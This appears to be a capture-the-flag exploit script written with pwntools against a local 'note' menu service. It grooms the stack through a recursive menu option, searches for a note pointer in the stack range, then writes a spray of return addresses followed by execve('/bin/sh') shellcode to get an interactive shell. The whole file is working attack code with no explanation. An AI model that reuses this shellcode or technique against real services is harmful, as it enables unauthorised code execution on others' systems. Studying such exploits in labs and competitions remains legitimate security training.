from pwn import *

#note


context(arch="amd64", os="linux")
#pro = process("./note", aslr=False)
pro = remote("127.0.0.1", 9019)

def ru(x, show=True):
    global pro
    if isinstance(x, str):
        res = pro.recvuntil(x.encode())
    else:
        res = pro.recvuntil(x)
    if not show:
        return res
    try:
        print(res.decode())
    except:
        print(res)
    return res

def rv(sz):
    global pro
    res = pro.recv(sz)
    try:
        print(res.decode())
    except:
        print(res)
    return res


def sl(data):
    global pro
    return pro.sendline(data)


def show_menu(show=True):
    ru(b"exit\n", show)

def send_201527(data, show=True):
    sl(b"201527")
    ru(b"pwn this\n", show)
    sl(data)

def loop_201527(sz):
    if sz == 1:
        send_201527(b"a" * 1024, False)
        return
    send_201527(b"a" * 1024 + b"201527")
    sz -= 1
    for _ in range(sz - 1):
        ru(b"pwn this\n", False)
        sl(b"a" * 1024 + b"201527")
    ru(b"pwn this\n", False)
    sl(b"a" * 1024)



def create_note():
    sl(b"1")
    res = ru(b"\n", False)
    if b"created" in res:
        idx = int(res.decode().strip().split(" ")[-1])
        ptr = ru(b']', False)
        ptr = int(ptr[-9: -1], 16)
        return idx, ptr
    return None, None

def write_note(idx, data):
    sl(b"2")
    ru(b'no?\n')
    sl(str(idx).encode())
    res = ru(b"\n")
    if b"index out of range" in res:
        return 1
    if b"empty slut!" in res:
        return 2
    sl(data)
    return 0

def delete_note(idx):
    sl(b"4")
    ru(b'no?\n', False)
    sl(str(idx).encode())
    res = ru(b"\n", False)
    if b"index out of range" in res:
        return 1
    if b"empty slut!" in res:
        return 2
    return 0


def read_note(idx):
    sl(b'3')
    ru(b'no?\n')
    sl(str(idx).encode())
    res = ru(b"- Select Menu -")
    res = res[:-16]
    if b"index out of range" in res:
        return None, 1
    if b"empty slut!" in res:
        return None, 2
    return res, 0


def exit_note():
    sl(b'5')
    ru(b'bye\n')


shellcode = b"\xeb\x0b\x5b\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
print(len(shellcode))

show_menu()
loop_201527(1000)

while True:
    idx, ptr = create_note()
    show_menu(False)
    if ptr is None:
        print("ptr fail", ptr)
        continue
    if ptr >= 0xffc00000 and ptr < 0xffff0000:
        print("idx:", ptr, "\tptr:", hex(ptr))
        break
    delete_note(0)
    show_menu(False)
exec_addr = ptr + 4000
note_content = p32(exec_addr) * 1000 + shellcode
print("exec addr:", hex(exec_addr))
write_note(0, note_content)
show_menu(False)
res, code = read_note(0)
show_menu(False)
exit_note()
pro.interactive()
